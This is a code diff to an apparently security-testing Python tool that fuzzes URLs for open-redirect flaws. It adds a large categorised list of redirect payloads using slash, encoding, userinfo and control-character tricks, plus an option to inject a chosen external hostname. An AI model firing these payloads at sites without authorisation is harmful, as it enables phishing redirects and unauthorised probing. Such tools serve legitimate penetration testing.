@@ -19,50 +19,90 @@ DARK_GREEN = '\033[32m'   # Dark Green
 ENDC = '\033[0m'          # Reset to default color
 
 redirect_payloads = [
-"//example.com@google.com/%2f..",
-"///google.com/%2f..",
-"///example.com@google.com/%2f..",
-"////google.com/%2f..",
-"https://google.com/%2f..",
-"https://example.com@google.com/%2f..",
-"/https://google.com/%2f..",
-"/https://example.com@google.com/%2f..",
-"//google.com/%2f%2e%2e",
-"//example.com@google.com/%2f%2e%2e",
-"///google.com/%2f%2e%2e",
-"///example.com@google.com/%2f%2e%2e",
-"////google.com/%2f%2e%2e",
-"/http://example.com",
-"/http:/example.com",
-"/https:/%5cexample.com/",
-"/https://%09/example.com",
-"/https://%5cexample.com",
-"/https:///example.com/%2e%2e",
-"/https:///example.com/%2f%2e%2e",
-"/https://example.com",
-"/https://example.com/",
-"/https://example.com/%2e%2e",
-"/https://example.com/%2e%2e%2f",
-"/https://example.com/%2f%2e%2e",
-"/https://example.com/%2f..",
-"/https://example.com//",
-"/https:example.com",
-"/%09/example.com",
-"/%2f%2fexample.com",
-"/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
-"/%5cexample.com",
-"/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
-"/.example.com",
-"//%09/example.com",
-"//%5cexample.com",
-"///%09/example.com",
-"///%5cexample.com",
-"////%09/example.com",
-"////%5cexample.com",
-"/////example.com",
-"/////example.com/",
-"////\;@example.com",
-"////example.com/"
+    # Scheme-relative and slash confusion
+    "//example.com",
+    "///example.com",
+    "////example.com",
+    "/////example.com",
+    "////example.com/",
+    "//example.com/",
+    "//example.com/%2f..",
+    "//example.com/%2f%2e%2e",
+    "//example.com/%2e%2e",
+    "//example.com/%252f..",
+    "//example.com/%252e%252e",
+    "/%2f%2fexample.com",
+    "/%2f%2fexample.com/",
+    "/%2F%2Fexample.com/%2e%2e",
+    "/%5cexample.com",
+    "/%5c%5cexample.com",
+    "/\\example.com",
+    "/\\\\example.com",
+    "/./example.com",
+    "/../example.com",
+    "/.example.com",
+    "/..;/example.com",
+    "/;/example.com",
+    "/%2e/example.com",
+    "/%2e%2e/example.com",
+    "/%2e%2e%2fexample.com",
+    "/%2e%2e%5cexample.com",
+    # Scheme confusion and mixed slash payloads
+    "http://example.com",
+    "https://example.com",
+    "https:/example.com",
+    "http:/example.com",
+    "/http://example.com",
+    "/https://example.com",
+    "/https://example.com/",
+    "/https://example.com/%2e%2e",
+    "/https://example.com/%2f..",
+    "/https://example.com//",
+    "/https:///example.com",
+    "/https:///example.com/%2e%2e",
+    "/https:///example.com/%2f%2e%2e",
+    "/https:example.com",
+    "/https:/%5cexample.com/",
+    "/https://%5cexample.com",
+    "/https://%09/example.com",
+    # Userinfo and delimiter abuse
+    "//example.com@google.com/%2f..",
+    "///example.com@google.com/%2f..",
+    "https://example.com@google.com/%2f..",
+    "/https://example.com@google.com/%2f..",
+    "//example.com@google.com/%2f%2e%2e",
+    "///example.com@google.com/%2f%2e%2e",
+    "//example.com%40google.com",
+    "//example.com%2F@google.com",
+    "//example.com%23@google.com",
+    "//example.com%3f@google.com",
+    "////\\;@example.com",
+    "////;@example.com",
+    "//google.com/%2f..",
+    "///google.com/%2f..",
+    "////google.com/%2f..",
+    "https://google.com/%2f..",
+    "/https://google.com/%2f..",
+    "//google.com/%2f%2e%2e",
+    "///google.com/%2f%2e%2e",
+    "////google.com/%2f%2e%2e",
+    # Tab/newline/control-char variations
+    "//%09/example.com",
+    "///%09/example.com",
+    "////%09/example.com",
+    "//%0d%0a/example.com",
+    "/%09/example.com",
+    "/%0d/example.com",
+    "/%0a/example.com",
+    # Query/fragment tricks used in redirect sinks
+    "//example.com#",
+    "//example.com/%23",
+    "//example.com?#",
+    "//example.com?next=/",
+    "//example.com?redirect=/",
+    "https://example.com#@google.com",
+    "https://example.com?@google.com",
+    "https://example.com/%09@google.com",
 ]
 
 RANDOM_USER_AGENTS = [
@@ -74,12 +114,33 @@ RANDOM_USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
 ]
 
-async def load_payloads(payloads_file):
+def normalize_external_server(external_server: str) -> str:
+    candidate = external_server.strip()
+    if not candidate:
+        raise ValueError("external server cannot be empty")
+
+    if "://" in candidate:
+        parsed = urlparse(candidate)
+        candidate = parsed.netloc
+
+    candidate = candidate.split("/")[0].strip()
+    if not candidate:
+        raise ValueError("external server must include a host")
+
+    return candidate
+
+
+def apply_external_server(payloads: List[str], external_server: str) -> List[str]:
+    return [payload.replace("example.com", external_server) for payload in payloads]
+
+
+async def load_payloads(payloads_file, external_server):
     if payloads_file:
         with open(payloads_file) as f:
-            return [line.strip() for line in f]
-    else:
-        return redirect_payloads  # Return hardcoded list if no file specified
+            payloads = [line.strip() for line in f if line.strip()]
+            return apply_external_server(payloads, external_server)
+
+    return apply_external_server(redirect_payloads, external_server)
 
 
 def fuzzify_url(url: str, keyword: str) -> str:
@@ -140,7 +201,7 @@ async def process_urls(semaphore, session, urls, payloads, keyword):
         await asyncio.gather(*tasks, return_exceptions=True)
 
 async def main(args):
-    payloads = await load_payloads(args.payloads)
+    payloads = await load_payloads(args.payloads, args.external_server)
     urls = load_urls()
     tqdm.write(f'[INFO] Processing {len(urls)} URLs with {len(payloads)} payloads.')
     selected_user_agent = None
@@ -173,12 +234,21 @@ if __name__ == "__main__":
     parser.add_argument('-p', '--payloads', help='file of payloads', required=False)
     parser.add_argument('-k', '--keyword', help='keyword in urls to replace with payload (default is FUZZ)', default="FUZZ")
     parser.add_argument('-c', '--concurrency', help='number of concurrent tasks (default is 100)', type=int, default=100)
+    parser.add_argument(
+        '--external-server',
+        help='external server hostname to inject into payloads (default: example.com)',
+        default='example.com',
+    )
     user_agent_group = parser.add_mutually_exclusive_group()
     user_agent_group.add_argument('--user-agent', help='set a custom User-Agent header')
     user_agent_group.add_argument('--random-agent', action='store_true', help='pick a random User-Agent header for this run')
     args = parser.parse_args()
     if args.user_agent is not None and not args.user_agent.strip():
         parser.error('--user-agent cannot be empty')
+    try:
+        args.external_server = normalize_external_server(args.external_server)
+    except ValueError as error:
+        parser.error(f'--external-server {error}')
     try:
         asyncio.run(main(args))
     except KeyboardInterrupt:
